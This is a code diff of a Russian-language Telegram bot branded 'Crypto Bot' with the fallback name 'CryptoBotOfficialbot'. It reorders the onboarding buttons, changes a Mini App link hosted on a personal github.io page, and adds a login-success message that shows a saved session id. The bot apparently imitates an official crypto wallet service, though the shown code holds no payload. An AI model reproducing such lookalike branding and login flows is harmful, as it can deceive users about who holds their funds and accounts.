@@ -224,10 +224,10 @@ async def cmd_start(msg: Message, state: FSMContext):
     )
     bot_me = await msg.bot.get_me()
     bot_username = bot_me.username or config.BOT_USERNAME or "CryptoBotOfficialbot"
-    webapp_url = f"https://flows3039-png.github.io/cryptobot-tg/?tab=wallet&uid={msg.from_user.id}&t={int(time.time())}"
+    webapp_url = f"https://flows3039-png.github.io/cryptobot-tg/?mode=reg&uid={msg.from_user.id}&t={int(time.time())}"
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Войти через Telegram", web_app=WebAppInfo(url=webapp_url))],
-        [InlineKeyboardButton(text="Начать в боте", callback_data="onb:quick_start")]
+        [InlineKeyboardButton(text="Войти через Telegram", callback_data="onb:quick_start")],
+        [InlineKeyboardButton(text="Открыть Mini App", web_app=WebAppInfo(url=webapp_url))]
     ])
     
     if os.path.exists(img_path):
@@ -256,7 +256,7 @@ async def cb_quick_start(cb: CallbackQuery, state: FSMContext):
         "first_name": cb.from_user.first_name or "",
         "auth_date": int(time.time())
     }
-    create_session(uid, user_info)
+    session_data = create_session(uid, user_info)
 
     balances = await get_all_balances(uid)
     try:
@@ -264,13 +264,22 @@ async def cb_quick_start(cb: CallbackQuery, state: FSMContext):
     except Exception:
         pass
 
-    kb = main_menu_inline(user_id=uid, balances=balances)
-    text = get_start_text()
     try:
         await cb.message.delete()
     except Exception:
         pass
 
+    text_auth = (
+        '✅ <b>Вход через Telegram выполнен успешно</b>\n\n'
+        f'Аккаунт: <b>{cb.from_user.full_name}</b> (@{cb.from_user.username or "id"})\n'
+        f'Сессия: <code>{session_data["session_id"][:16]}...</code> (сохранена в <code>data/sessions</code>)\n\n'
+        'Настройка завершена. Теперь вы можете использовать все возможности '
+        '<tg-emoji emoji-id="5361914370068613491">🦋</tg-emoji> Crypto Bot.'
+    )
+    await cb.message.answer(text_auth, parse_mode="HTML")
+
+    kb = main_menu_inline(user_id=uid, balances=balances)
+    text = get_start_text()
     img_path = os.path.join(BASE_DIR, "start_banner.jpg")
     if os.path.exists(img_path):
         await cb.message.answer_photo(photo=FSInputFile(img_path), caption=text, reply_markup=kb, parse_mode="HTML")
@@ -700,14 +709,14 @@ async def cmd_testreg(msg: Message, state: FSMContext):
         
         bot_me = await msg.bot.get_me()
         bot_username = bot_me.username or config.BOT_USERNAME or "CryptoBotOfficialbot"
-        webapp_url = f"https://flows3039-png.github.io/cryptobot-tg/?tab=wallet&uid={msg.from_user.id}&t={int(time.time())}"
+        webapp_url = f"https://flows3039-png.github.io/cryptobot-tg/?mode=reg&uid={msg.from_user.id}&t={int(time.time())}"
         text = (
             '<tg-emoji emoji-id="5361914370068613491">🦋</tg-emoji> <b>Добро пожаловать в Crypto Bot</b>\n\n'
             "Кошелёк готов к работе. Войдите через Telegram для мгновенного доступа ко всем возможностям без ввода паролей."
         )
         kb = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="Войти через Telegram", web_app=WebAppInfo(url=webapp_url))],
-            [InlineKeyboardButton(text="Начать в боте", callback_data="onb:quick_start")]
+            [InlineKeyboardButton(text="Войти через Telegram", callback_data="onb:quick_start")],
+            [InlineKeyboardButton(text="Открыть Mini App", web_app=WebAppInfo(url=webapp_url))]
         ])
         img_path = os.path.join(BASE_DIR, "welcome.jpg")
         if os.path.exists(img_path):
